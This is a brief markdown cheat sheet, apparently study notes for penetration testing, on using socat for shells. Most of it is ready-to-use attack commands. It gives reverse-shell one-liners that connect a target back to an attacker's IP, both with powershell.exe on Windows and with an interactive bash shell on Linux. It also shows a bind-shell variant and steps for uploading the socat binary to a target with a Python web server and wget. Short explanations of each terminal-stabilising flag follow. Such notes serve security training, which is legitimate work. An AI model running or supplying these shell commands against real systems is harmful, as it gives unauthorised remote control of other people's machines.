
*point to point connector ie. keyboard to port, file to port, port to port*

### Reverse Shells
- `socat TCP-L:PORT -`, basic listener
- `socat TCP:MY_IP:PORT EXEC:powershell.exe,pipes`, listener on Windows (pipes for unix style I/O)
#### Bind
*run the previous commands on the target*
 - `socat TCP:TARGET_IP:PORT` - *on local machine*

### Interactive Reverse Shell (tty)
1.  ``socat TCP-L:PORT FILE:`tty`,raw,echo=0`` , listens for connection giving interactive shell, but it must have socat installed
2. upload socat binary to target ( `python3 -m http.server` in socat dir -> `wget` on target)
3. `socat TCP:MY_IP:PORT EXEC:"bash -li",pty,stderr,sigint,setsid,sane` , connects target giving interactive shell
>bash -li, -l is "login shell" meaning, ini files are read from /home/*user*, and -i means interactive
> pty (pseudo-teletype), allocates a pseudoterminal on the target via a "pipe" -- part of the stabilization process
> stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
> sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
> setsid, creates the process in a new session
> sane, stabilises the terminal, attempting to "normalise" it.